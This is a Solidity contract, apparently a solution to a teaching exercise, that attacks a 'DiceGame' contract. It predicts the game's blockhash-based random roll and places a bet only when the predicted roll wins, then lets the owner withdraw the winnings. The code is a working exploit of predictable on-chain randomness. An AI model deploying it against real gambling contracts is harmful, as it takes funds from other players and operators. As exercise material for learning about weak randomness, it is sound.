// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

contract RiggedRoll is Ownable {
    
    DiceGame public diceGame;
    
    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }
    
    /**
     * @notice Receive function để nhận ETH từ faucet
     */
    receive() external payable {}
    
    /**
     * @notice Rigged roll - chỉ roll khi biết chắc thắng!
     */
    function riggedRoll() public {
        // Check contract có đủ 0.002 ETH không
        require(address(this).balance >= 0.002 ether, "Not enough ETH to roll");
        
        // HACK: Predict random number giống y hệt DiceGame
        // Copy logic từ DiceGame.sol
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;
        
        console.log("Predicted roll:", roll);
        
        // CHỈ roll khi biết chắc thắng (0-5)
        require(roll <= 5, "Predicted roll is losing, not rolling!");
        
        // Roll với 0.002 ETH
        diceGame.rollTheDice{value: 0.002 ether}();
    }
    
    /**
     * @notice Withdraw winnings về owner
     * @param _addr Địa chỉ nhận tiền
     * @param _amount Số tiền rút
     */
    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        require(address(this).balance >= _amount, "Insufficient balance");
        (bool success, ) = _addr.call{value: _amount}("");
        require(success, "Withdraw failed");
    }
    
    /**
     * @notice Check balance của contract
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}